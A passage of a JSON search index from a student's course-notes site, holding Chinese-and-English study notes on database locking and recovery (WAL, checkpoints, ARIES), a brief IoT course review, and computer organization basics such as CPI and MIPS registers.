granularity*","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#94-insert-and-deletion","title":"9.4 insert and deletion","text":"<p>\u524d\u9762\u90fd\u628a\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u7b80\u5316\u6210\u4e86\u8bfb\u548c\u5199\uff0c\u90a3\u4e48\u6211\u4eec\u73b0\u5728\u6765\u8003\u8651\u5b9e\u9645\u7684insert\u548cdelete\u64cd\u4f5c</p> <p>\u5982\u679c\u4f7f\u7528\u4e24\u9636\u6bb5\u9501</p> <ul> <li>\u6570\u636edelete\u4e4b\u524d\u90fd\u5f97\u7ed9\u4ed6\u52a0\u4e0aX\u9501</li> <li>\u6570\u636einsert\u4e4b\u540e\u8981\u7ed9\u4ed6\u52a0\u4e0aX\u9501</li> </ul> <p>\u786e\u4fdd\u4ee5\u4e0b\u4e24\u70b9</p> <p>\u200b\u200b</p> <p>\u540c\u65f6\u4f1a\u5bfc\u81f4\u5e7d\u7075\u95ee\u9898\uff0c\u6bd4\u5982\u4e00\u4e2a\u4e8b\u7269\u7684\u4e24\u6b21\u8bfb\u8868\u4e2d\u95f4\uff0c\u5b58\u5728\u4e00\u4e2a\u4e8b\u7269\u7684\u63d2\u5165\u548c\u63d0\u4ea4\uff0c\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u4e8b\u52a1\u4e24\u6b21\u8bfb\u4e0d\u4e00\u81f4</p> <p>\u907f\u514d\u7684\u65b9\u6cd5\u662f\u6574\u4e2a\u8868\u52a0\u4e2a\u9501\uff0c\u53ef\u4ee5\u907f\u514d\u6b7b\u9501\uff0c\u4f46\u662f\u6548\u7387\u4f1a\u4e0b\u964d</p> <p>index locking protocol to prevent phantoms</p> <p>\u8c13\u8bcd\u52a0\u9501\u673a\u5236\u53ef\u4ee5\u901a\u8fc7index locking protocol\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\u6211\u63d2\u5165\u4e86\u4e00\u6761\u5e74\u9f84\u4e3a18\u7684student\u6570\u636e\uff0c\u6211\u5bf9\u4e8e\u6240\u6709\u7684\u5173\u4e8eage\u5305\u62ec18\u7684\u67e5\u8be2\u90fd\u9700\u8981\u51b2\u7a81\u6389\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u8c13\u8bcd\u52a0\u9501</p> <p>\u5728\u8fd9\u4e2a\u534f\u8bae\u4e0a\uff0c\u5c31\u5728index\u7684\u53f6\u5b50\u4e0a\u52a0\u9501\uff0c\u6bd4\u5982\u572818\u5c81\u6240\u5728\u7684\u53f6\u5b50\u4e0a\u52a0\u9501</p> <p>\u200b\u200b</p> <p>\u8fd8\u6709\u53e6\u4e00\u4e2a\u534f\u8bae</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#95-multiversion-locking","title":"9.5 multiversion locking","text":"<p>\u5bf9\u4e8e\u6570\u636e\u4ea7\u751f\u4e00\u7cfb\u5217\u65b0\u7684\u7248\u672c</p> <p>\u4e8b\u52a1\u8981\u58f0\u660e\u53ea\u8bfb\u8fd8\u662f\u8bfb\u5199</p> <p>\u200b\u200b</p> <ul> <li> <p>update</p> </li> <li> <p>\u200b\u200b</p> </li> <li> <p>read-only</p> </li> <li> <p>\u200b\u200b</p> </li> </ul> <p>\u200b\u200b</p> <p>read-only \u4e8b\u52a1\u4e5f\u9700\u8981\u65f6\u95f4\u6233\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u4efb\u4f55\u9501</p> <p>\u200d</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#10-recovery","title":"10. recovery","text":"<p>\u6062\u590d\u672c\u8eab\u662f\u8981\u4fdd\u6301\u8fd9\u4e24\u4e2a\u6027\u8d28</p> <ol> <li>Durability: \u4e8b\u52a1\u4e00\u65e6\u5b8c\u6210\uff0c\u6211\u4eec\u6c38\u8fdc\u4e0d\u4f1a\u4e22\u5931\u4e8b\u52a1\u7684\u7ed3\u679c</li> <li>Atomicity: \u4e8b\u52a1\u6c38\u8fdc\u4e0d\u4f1a\u5904\u4e8e\u4e2d\u95f4\u6001\uff0c\u8981\u4e48\u5b8c\u6210\uff0c\u8981\u4e48\u5b8c\u6210\u4e0d\u505a</li> </ol> <p>\u6545\u969c\u53d1\u751f\u7684\u539f\u56e0</p> <ol> <li>transaction failure: \u4f8b\u5982\u975e\u6cd5\u8f93\u5165\uff0c\u975e\u6cd5\u66f4\u65b0\uff0c\u6b7b\u9501\u7b49\uff0clogical error/system error</li> <li>system crash: power failure hardware/software failure</li> <li>disk failure\uff1ahead crash</li> </ol> <p>\u5bf9\u4e8eDatabase recovery\u6211\u4eec\u8981\u91c7\u7528strict two-phase locking ensure no dirty read</p> <p>\u5e76\u4e14\u8981\u4fdd\u8bc1idempotent</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#101-stable-storage","title":"10.1 stable storage*","text":"<p>\u6211\u4eec\u8fd9\u91cc\u63d0\u51fa\u4e00\u79cd\u65b0\u7684storage\uff0c\u6bd4nonvolatile storage\u66f4\u9ad8\u4e00\u5c42\u7684stable storage\uff0c\u89c6\u4e3a\u4e00\u79cd\u53ef\u4ee5\u62b5\u5fa1\u4efb\u4f55failure\u7684\u7406\u60f3\u4ecb\u8d28</p> <ul> <li>a mythical form of storage that survives all failures</li> </ul> <p>\u4e66\u672c\u4e0a\u7b80\u5355\u4ecb\u7ecd\u4e86\u8fd9\u79cd\u4ecb\u8d28\u7684\u5b9e\u73b0\uff0c\u6709\u4ee5\u4e0b\u4e09\u4e2a\u6027\u8d28</p> <ul> <li>Maintain multiple copies of each block on separate disks</li> <li> <p>Failure during data transfer can still result in inconsistent copies\uff0c\u5b58\u5728\u4e09\u79cd\u60c5\u51b5</p> </li> <li> <p>successful completion</p> </li> <li>partial failure</li> <li>total failure</li> <li> <p>Protecting storage media from failure during data transfer</p> </li> <li> <p>\u6267\u884coutput operation \u8981\u7ef4\u62a4\u4e24\u4e2ablock</p> <ol> <li>\u5199\u5230\u7b2c\u4e00\u4e2aphysical block</li> <li>\u7b2c\u4e00\u4e2a\u5199\u6210\u529f\u4e86\uff0c\u5c06\u76f8\u540c\u4fe1\u606f\u5199\u5230\u7b2c\u4e8c\u4e2a</li> <li>\u7b2c\u4e8c\u4e2a\u5199\u5165\u6210\u529f\u4e4b\u540e\u624d\u4f1a\u8f93\u51fa</li> </ol> </li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#102-log-record","title":"10.2 log record","text":"<p>\u4e3a\u4e86\u4fdd\u6301log\u7684\u6709\u6548\u6027\uff0c\u6211\u4eec\u5fc5\u987b\u628alog\u5199\u5165stable storage\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u91c7\u53d6\u4e00\u4e9b\u624b\u6bb5\u6765\u51cf\u5c11\u8fd9\u4e2a\u5199\u7684\u5f00\u9500</p> <p>log\u7684\u57fa\u672c\u5f62\u5f0f</p> <p>\u200b\u200b</p> <p>\u9075\u5faawrite-ahead logging WAL \u65e5\u5fd7\u5148\u5199\u539f\u5219\uff1a\u5f53\u6570\u636e\u4ece\u4e3b\u5b58output\u5230\u78c1\u76d8\u4e0a\u4e4b\u524d\uff0c\u8981\u5148\u628alog record\u5199\u5230stable storage\u4e2d</p> <p>deferred-modification and immediate-modification</p> <ul> <li>deferred \u4e8b\u52a1\u5728\u63d0\u4ea4\u4e4b\u524d\u90fd\u4e0d\u4fee\u6539\u6570\u636e\uff1a\u9700\u8981\u5efa\u7acb\u4fee\u6539\u6570\u636e\u9879\u7684\u672c\u5730\u5907\u4efd\uff0ccommit\u4e4b\u540e\u9760log\u5199\uff0ccrash\u4e4b\u540e\uff0c\u4e4b\u6709commit\u7684\u9700\u8981\u6309\u7167commit\u7684\u987a\u5e8f\u4f9d\u6b21redo</li> <li>immediate \u4e8b\u52a1\u6d3b\u8dc3\u7684\u65f6\u5019\u5c31\u4f1a\u4fee\u6539\u6570\u636e</li> </ul> <p>concurrency control and recovery</p> <p>\u9700\u8981\u4e8b\u52a1\u4f7f\u7528\u4e25\u683c\u4e24\u9636\u6bb5\u9501</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#103-checkpoint","title":"10.3 checkpoint","text":"<p>redo/undo \u6240\u6709\u7684\u4e8b\u52a1\u4f1a\u662f\u975e\u5e38\u6162\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981checkpoint</p> <p>streamline recovery procedure by periodicalluy perfromaing checkpointing</p> <ul> <li>Output all log records currently residing in main memory onto stable storage.</li> <li>Output all modified buffer blocks to the disk</li> <li>Write a log record &lt; checkpoint L&gt; onto stable storage where L is a list of all transactions active at the time of checkpoint.</li> <li>\u5728\u505acheckpoint\u671f\u95f4\u505c\u6b62\u6240\u6709\u7684updates</li> </ul> <p>\u6211\u4eec\u6839\u636echeckpoint\u91cc\u7684\u6240\u6709\u4e8b\u52a1+checkpoint\u4e4b\u540elog\u91cc\u7684\u4e8b\u52a1\uff0c\u89c6\u4f5c\u4e00\u4e2a\u96c6\u5408T\uff0c\u5982\u679cT\u4e2d\u7684\u4e8b\u52a1A\u5df2\u7ecfcommit/abort \u5c31\u6267\u884credo\uff0c\u53cd\u4e4b\u5c31\u53ea\u60f3undo</p> <p>fuzzy checkpoint</p> <p>To avoid long interruption of normal processing during checkpointing, allow updates to happen during checkpointing</p> <p>checkpoint\u5148\u628a\u810fpage\u7ed9\u8bb0\u5f55\u4e0b\u6765\uff0c\u968f\u540e\u6162\u6162\u5730\u628a\u810fpage\u5199\u5165\u78c1\u76d8\uff0c\u76f4\u5230\u6700\u540e\u4e00\u4e2a\u810fpage\u5199\u5165\u78c1\u76d8\uff0c\u8bbe\u7f6e\u8be5checkpoint\u662f\u6210\u529f\u7684</p> <p>redo and undo</p> <p>\u6b63\u5e38\u7684\u4e8b\u52a1\u56de\u6eda\u4e2d\u53ea\u505aundo\uff0c\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u6b21\u91cd\u505a\u5199\u4e00\u4e2a\u53ea\u8bfb\u7684\u65e5\u5fd7CLR(compensation log record) \u627e\u5230\u4e86start\u5c31\u5199\u4e00\u4e2aabort</p> <ul> <li> <p>redo</p> </li> <li> <p>\u9047\u5230\u6b63\u5e38\u65e5\u5fd7\u548cCLR\uff08\u4e5f\u662fredo-only\u65e5\u5fd7\uff09\u5c31\u91cd\u505a</p> </li> <li>\u9047\u5230T start \u52a0\u5230undo-list\u4e2d</li> <li>\u9047\u5230T abort/commit \u5c31\u4eceundo list\u91cc\u9762\u53bb\u6389</li> <li> <p>undo</p> </li> <li> <p>undo list\u91cc\u9762\u505a\u6b63\u5e38\u4e8b\u52a1\u56de\u6eda</p> </li> </ul> <p>\u4e00\u4e2a\u4f8b\u5b50</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#104-log-record-buffer","title":"10.4 log record buffer","text":"<p>\u5728\u4e4b\u524d\u6211\u4eec\u90fd\u5047\u8bbelog record\u751f\u6210\u5c31\u5199\u5230stable storage\u4e2d\uff0c\u4f46\u8fd9\u5b9e\u9645\u4e0a\u6bd4\u8f83\u4f4e\u6548\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u6709\u4e86log record buffering</p> <p>group commit: \u5c06\u4e00\u4e2ablock\u7684log\u4e00\u6b21\u6027\u5199\u5165stable storage\uff0c\u964d\u4f4eIO\u5f00\u9500</p> <p>\u4e3a\u4e86\u7ef4\u62a4\u539f\u5b50\u6027\uff0c\u8981\u6ee1\u8db3\u4e00\u4e9b\u6027\u8d28</p> <ul> <li>Log records are output to stable storage in the order in which they are created.</li> <li>Transaction Ti enters the commit state only when the log record  has been output to stable storage. <li>Before a block of data in main memory is output to the database, all log records pertaining to data in that block must have been output to stable storage. \u8fd9\u4e00\u5757\u5c31\u662fWAL\u539f\u5219</li> <p>Database buffer</p> <ul> <li>force \u63d0\u4ea4\u65f6\u5f3a\u5236\u628a\u6240\u6709\u76f8\u5173page output\u5230disk</li> <li> <p>no-force \u76f8\u53cd</p> </li> <li> <p>no-steal \u6d3b\u8dc3\u4e8b\u52a1\u7684\u76f8\u5173block\u90fd\u4e0d\u80fd\u5199\u5230disk</p> </li> <li>steal \u53cd\u4e4b</li> </ul> <p>\u5f53\u6211\u4eec\u8981\u5199\u4e00\u4e2ablock\u56de\u5230\u78c1\u76d8\u7684\u65f6\u5019\uff0c\u9700\u8981\u5bf9\u8fd9\u4e2ablock\u52a0\u4e0alatch\uff0c\u5e76\u4e14\u5c06\u4e0e\u4e4b\u76f8\u5173\u7684log\u5199\u5165\u78c1\u76d8\uff0c\u518d\u628ablock\u5199\u5165\u78c1\u76d8\uff0c\u91ca\u653e\u9501</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#105-failure-with-loss-of-nonvolatile-storage","title":"10.5 Failure with loss of nonvolatile storage","text":"<p>\u4e0a\u8ff0\u8ba8\u8bba\u7684\u90fd\u662f\u5185\u5b58\u91cc\u6545\u969c\u7684\u60c5\u5f62\uff0c\u5982\u679c\u8fde\u78c1\u76d8\u91cc\u5b58\u7684\u6570\u636e\u90fd\u51fa\u95ee\u9898\u4e86\u5462</p> <p>Periodically dump the entire content of the database to stable storage</p> <p>dump\u8fc7\u7a0b\u8981\u6c42\u7c7b\u4f3c\u4e8e\u4e25\u683c\u7684checkpoint</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#106-recovery-with-early-lock-release-and-logical-undo-operations","title":"10.6 recovery with early lock release and logical undo operations*","text":"<p>\u6211\u4eec\u56e0\u4e3a\u8981\u63d0\u9ad8\u5e76\u53d1\u5ea6\uff0c\u7279\u522b\u662f\u5bf9bp\u6811\u64cd\u4f5c\u7684\u60c5\u5f62\uff0c\u53ef\u80fd\u4f1a\u91c7\u7528\u975e\u4e24\u9636\u6bb5\u7684\u5f62\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u6709\u53ef\u80fd\u63d0\u524d\u91ca\u653e\u9501</p> <p>\u5bf9\u4e8e\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8981\u6062\u590d\u662f\u5220\u9664\u8be5\u5143\u7d20</p> <p>Recovery based on \u201crepeating history\u201d, whereby recovery executes exactly the same actions as normal processing</p> <p>\u4f46\u662f\u5bf9\u4e8ebp\u6811\u800c\u8a00\uff0c\u6211\u4eec\u4e0d\u80fd\u7528physical undo\uff0c\u4e5f\u5373\u91cd\u65b0\u5b58\u50a8old value\uff1b\u800c\u662f\u9700\u8981\u6267\u884clogical undo\uff0c\u5c31\u662finsertion\u901a\u8fc7deletion\u64a4\u9500</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#107-aries","title":"10.7 Aries*","text":"<p>ARIES is a state of the art recovery method</p> <ul> <li>\u4f7f\u7528LSN log sequence number to identify log records\uff0c\u5c06\u4f1a\u628aLSN\u5b58\u5230page\u4e0a</li> <li>Physiological redo \u53d7\u5f71\u54cd\u7684page\u662f\u7269\u7406\u6807\u5fd7\u7684\uff0c\u4f46\u5185\u90e8\u53ef\u80fd\u662f\u903b\u8f91\u7684</li> <li>Dirty page table</li> <li>Fuzzy checkpointing</li> </ul> <p>\u200b\u200b</p> <p>Special redo-only log record called compensation log record (CLR) used to log actions taken during recovery that never need to be undone.</p> <p>\u200b\u200b</p> <p>check point log record \u5305\u62ec</p> <ul> <li>Dirty Page Table \u5305\u62ec PagLSN \u548c RecLSN</li> <li>Active Transation\uff0cLastLSN the LSN of the last log record</li> </ul> <p>ARIES\u6d41\u7a0b</p> <ul> <li> <p>Analysis pass \u4e0d\u9700\u8981\u6570\u636e\u5e93block\u7684\u4f20\u8f93</p> </li> <li> <p>\u4ece\u6700\u540e\u7684\u5b8c\u6574checkpoint\u5f00\u59cb</p> <ul> <li>\u8bfbDirty Page Table\uff0c\u5c06RedoLSN\u8bbe\u7f6e\u4e3amin{RecLSN of all pages}\uff0c\u5982\u679c\u6ca1\u6709\u810fpage\uff0c\u90a3\u4e48RedoLSN\u5c31\u662fcheckpoint\u7684LSN</li> <li>set undo-list = list of transactions in checkpoint log record</li> <li> <p>\u4ececheckpoint\u5f00\u59cbscan\u65e5\u5fd7</p> </li> <li> <p>\u5982\u679c\u6709\u4e2a\u4e8b\u52a1\u4e0d\u5b58\u5728\u4e8eundo-list\uff0c\u5c06\u5176\u52a0\u5165\u5230undo-list</p> </li> <li>\u5982\u679c\u6709\u4e8b\u52a1\u7ec8\u6b62\u4e86\uff0c\u90a3\u4e48\u5c06\u8be5\u4e8b\u52a1\u4eceundo-list\u91cc\u5220\u9664</li> <li>Keeps track of last log record for each transaction in undo-list</li> <li>\u5982\u679c\u53d1\u73b0\u6709page\u7684\u66f4\u65b0\u8bb0\u5f55\uff0c\u90a3\u4e48\u9700\u8981\u66f4\u65b0\u7684dirty page table\u4e0a\uff0c</li> </ul> <p>\u5982\u679c\u8be5\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\uff0c\u5206\u6790\u9636\u6bb5\u5c31\u5c06\u5b83\u52a0\u8fdb\u810f\u9875\u8868\u3002\u5e76\u8bbe\u91cf\u8be5\u9875\u7684RecLSN\u4e3a\u8be5\u65e5\u5fd7\u8bb0\u5f55\u7684LSN\u3002 * Redo pass</p> </li> <li> <p>\u4eceRedoLSN\u5f00\u59cb\u626b\u63cflog\uff0c\u53ea\u5173\u5fc3update\u64cd\u4f5c</p> </li> <li>\u5bf9\u4e8e\u8fd9\u4e2a\u65e5\u5fd7\u5bf9\u5e94\u7684page\uff0c\u5982\u679c\u8be5page\u4e0d\u5728\u810f\u9875\u8868\uff0c\u6216\u8005\u66f4\u65b0\u65e5\u5fd7LSN\u5c0f\u4e8e\u810f\u9875\u8868\uff0c\u8df3\u8fc7\u8be5\u65e5\u5fd7</li> <li>\u53cd\u4e4b\uff0c\u5c31\u4ece\u78c1\u76d8\u8c03\u51fa\u8be5page\uff0c\u5982\u679c\u66f4\u65b0\u65e5\u5fd7LSN\u5927\u4e8epageLSN\uff0c\u5c31\u91cd\u505a</li> <li> <p>Undo pass</p> </li> <li> <p>\u5bf9\u65e5\u5fd7\u8fdb\u884c\u53cd\u5411\u626b\u63cf\uff0c\u5bf9undo-list\u91cc\u9762\u6240\u6709\u4e8b\u7269\u8fdb\u884c\u64a4\u9500</p> </li> <li>\u6bcf\u5f53\u627e\u5230\u4e00\u4e2a\u9700\u8981\u64a4\u9500\u7684\u65e5\u5fd7\uff0c\u5c31\u6267\u884c\u4e00\u4e2aundo\uff0c\u751f\u6210\u4e00\u4e2aCLR\uff0c\u5e76\u4e14\u628aCLR\u7684undoNextLSN\u8bbe\u7f6e\u4e3a\u8be5\u66f4\u65b0\u65e5\u5fd7\u8bb0\u5f55\u7684PrevLSN</li> <li>\u5982\u679c\u53cd\u5411\u626b\u63cf\u7684\u65f6\u5019\u9047\u5230CLR\uff0c\u76f4\u63a5\u8f6c\u5230undoNextLSN\u7684\u4f4d\u7f6e</li> </ul> \\[ \\prod_{A}(\\prod_{AB}(r))=\\prod_{A}(r) \\] <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E7%89%A9%E8%81%94%E7%BD%91/%E7%89%A9%E8%81%94%E7%BD%91/","title":"\u7269\u8054\u7f51\u6280\u672f\u57fa\u7840\u4e0e\u5e94\u7528\u5f00\u53d1","text":"<p>\u7269\u8054\u7f51\u6280\u672f\u57fa\u7840\u4e0e\u5e94\u7528\u5f00\u53d1\u7ecf\u9a8c\u5206\u4eab</p> <p>\u8f6f\u5de5\u8fd9\u5b66\u671f\u65b0\u589e\u52a0\u7684\u5fc5\u4fee\u8bfe\u7a0b\uff0c\u4eca\u5e74\u662f\u7b2c\u4e00\u6b21\u5f00\u8bfe\uff0c\u8bfe\u7a0b\u5206\u6570\u6784\u6210\u662f\u5c0f\u6d4b+\u5b9e\u9a8c+\u671f\u672b\uff0c\u5f88\u60ca\u559c\u7684\u662f\u5b9e\u9a8c\u8bbe\u8ba1\u7684\u975e\u5e38\u7cbe\u5f69\uff0c\u96be\u5ea6\u9002\u4e2d\uff0c\u505a\u5b8c\u90fd\u975e\u5e38\u6709\u6210\u5c31\u611f\uff0c\u800c\u4e14\u6709\u76f8\u5e94\u7684\u6846\u67b6\uff0c\u52a9\u6559\u8001\u5e08\u4e5f\u975e\u5e38\u7528\u5fc3\u5730\u4e3a\u6211\u4eec\u7b54\u7591\u89e3\u60d1\uff0c\u4f53\u9a8c\u975e\u5e38\u597d\u3002\u5c0f\u6d4b\u4e2d\u95f4\u968f\u673a\u7a7f\u63d2\uff0c\u7531\u4e8e\u662f\u7b2c\u4e00\u6b21\u5f00\u8bfe\u4e0d\u77e5\u9053\u89c4\u5f8b\uff0c\u6309\u7167\u4eca\u5e74\u7684\u7ecf\u9a8c\u53ef\u80fd\u4f1a\u51fa\u6559\u6750\u914d\u5957\u7684\u9898\u76ee\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u3002\u800c\u671f\u672b\u5141\u8bb8\u624b\u5199A4\u7eb8\uff0c\u4eca\u5e74\u8463\u73ae\u8001\u5e08\u5728\u6700\u540e\u4e00\u8282\u8bfe\u5212\u91cd\u70b9\u7684\u65f6\u5019\u75af\u72c2\u900f\u9898\uff0c\u6700\u540e\u51e0\u8282\u8bfe\u5927\u5bb6\u6700\u597d\u7559\u610f\u4e00\u4e0b\uff0c\u53ef\u4ee5\u8bf4\u6210\u7ee9\u7684\u7ed3\u679c\u5f88\u5927\u7a0b\u5ea6\u53d6\u51b3\u4e8eA4\u7684\u6c34\u5e73\u3002</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u539f\u7406","text":"<p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u539f\u7406\u7b14\u8bb0</p> <p>\u8f6f\u5de5\u7684\u7cfb\u7edf\u8bfe\uff0c\u4f7f\u7528MIPS\u67b6\u6784\uff0c\u5728\u57fa\u7840\u90e8\u5206\u548c\u8ba1\u6982\u57fa\u672c\u7c7b\u4f3c\uff0c\u4f46\u6df1\u5165\u90e8\u5206\u8bb2\u89e3\u4e86\u6d41\u6c34\u7ebf\uff0ccache\u548c\u865a\u62df\u5185\u5b58\u7b49\u6982\u5ff5\u6211\u81ea\u8ba4\u4e3a\u671f\u672b\u590d\u4e60\u548c\u7b14\u8bb0\u6574\u7406\u7684\u6bd4\u8f83\u5230\u4f4d\uff0c\u4f46\u662f\u6700\u540e\u5206\u6570\u5e76\u4e0d\u7406\u60f3\u8fd8\u88ab\u5361\u7ee9\u4e86QAQ\u3002\u6797\u8001\u5e08\u7684\u51fa\u9898\u98ce\u683c\u548c\u697csir\u5927\u76f8\u5f84\u5ead\uff0c\u56e0\u6b64\u5728\u671f\u672b\u590d\u4e60\u7684\u65f6\u5019\u9700\u8981\u5148\u786e\u8ba4\u90a3\u4f4d\u8001\u5e08\u51fa\u5377\uff0c\u5982\u679c\u6797\u8001\u5e08\u51fa\u9898\u8bf7\u52a1\u5fc5\u7ec6\u770b\u4f5c\u4e1a\u9898\u548cPPT\uff0c\u697c\u8001\u5e08\u51fa\u5377\u8bf7\u53c2\u7167\u524d\u4eba\u7ecf\u9a8c\u3002</p> <p>\u4f5c\u4e1a40 \u5927\u7a0b20 \u671f\u672b40\uff08\u624b\u5199A4</p> <p>\u7b2c\u516d\u7248\u6559\u6750</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#chapter1-computer-abstraction-and-technology-introduction-and-cpu-analysis","title":"chapter1 computer abstraction and technology, introduction and CPU analysis","text":"<p>IO including</p> <ul> <li>user interface devices</li> <li>storage part</li> <li>network part</li> </ul> <p>CPU including</p> <ul> <li>data path</li> <li>control</li> <li>cache memory (usually use the small fast SRAM</li> </ul> <p>defining the CPU performance</p> <ul> <li>response time : how long it takes to do a task</li> <li>throughput : total work done per unit time</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#measuring-execution-time","title":"**measuring execution time **","text":"<p>define the performance = 1/Execution time</p> <ul> <li>example: x is n time faster than Y   performance ex / performance ey = n = execution time y / execution time x</li> </ul> <p>Elapsed time\uff1a total response time, including processing, IO, os, idle time. It determines the system performance</p> <p>**CPU time: ** it is the part of elapse time. It is the processing time.</p> <p>To calculate the cpu time</p> <ul> <li>cpu clock we know that the operation of hardware is governed by a constant-rate clock. clock period ** is the duration of a clock cycle. like250ps=0.25ns=250x10^-12s. clock frequency ** is the number of cycles per second. like 4.0GHz=4000MHz</li> <li>**cpu time ** = cpu clock cycles x clock cycle time = cpu clock cycles / clock rate</li> </ul> <p>instruction count and CPI</p> <p>**instruction count : ** is the number of instruction, judged by program ISA and compiler</p> <p>**CPI : ** is the average cycles per instruction, judged by the instruction type and the cpu hardware</p> <ul> <li>clock cycles = instruction count * CPI</li> <li>cpu time = instruction count * CPI * clock cycle time(clock period)</li> </ul> <p>calculate the CPI</p> <p>CPI = clock cycles / instruction count(IC) PPT 48</p> <p>\u597d\u7684\u5e76\u53d1\u548c\u6d41\u6c34\u7ebf\uff0c\u4f7f\u5f97CPI\u53ef\u80fd\u53ef\u4ee5\u5c0f\u4e8e1</p> <p>power Trend \u80fd\u8017</p> <p>multiprocessors</p> <p>SPEC: a way to test CPU can test the number of instructions and power using.</p> <p>perfomance means the number of instruction the CPU excuting each second.</p> <p>A good standard to judge CPU is to find how many instructions can be done in each watt(\u74e6\u7279)\u5355\u4f4d\u80fd\u8017\u7684\u6267\u884c\u6570</p> <p>Amdahl Law</p> <p>T_improved = T_affected/improve factor + T_unaffected. A way to calcuate what the actual improve is, it will divide the affected part and unaffected part.</p> <p>MIPS</p> <p>MIPS: million of instructions per second MIPS=instruction count/(excution time*10^6)</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#chapter2-mips-instruction","title":"chapter2 MIPS instruction","text":"<p>CPU will decide and provide a interface. Different computer have different instruction set.</p> <p>In this book, we will use MIPS version of CPU to learning.</p> <p>32-bit data called a \"word\"</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#register","title":"register","text":"<p>It also a way to judge CPU, but it overlook the CPI, so it isn't so accurate.</p> <ol> <li>v0 to v1 are used as the return of function.</li> <li>a0 to a3 are used as the parameters of function.</li> <li>t0 to t7 are temporary variables, we should make sure each part of program don't need to protect the temporpary variables     can use it directly</li> <li>s0 to s7 are variable should be saved?</li> <li>k0 k1 are for operation system</li> </ol> <p>\u4e00\u6761\u6307\u4ee4\u5360\u56db\u4e2a\u5b57\u8282\uff0c\u6307\u4ee4\u8df3\u8f6c\u4f1a\u81ea\u52a8\u4e58\u4ee54\uff0c\u4f46\u662f\u5185\u5b58\u5206\u914d\u9700\u8981\u4f60\u81ea\u5df1\u4e584</p> <p>In MIPS, there are 32 registers, which has 32bits. There is a table to show the usage of each register. The data in register can be used in the fastest way. We can access to register in one clock time.</p> <p>Because we have 32 registers, so we use 5bits to 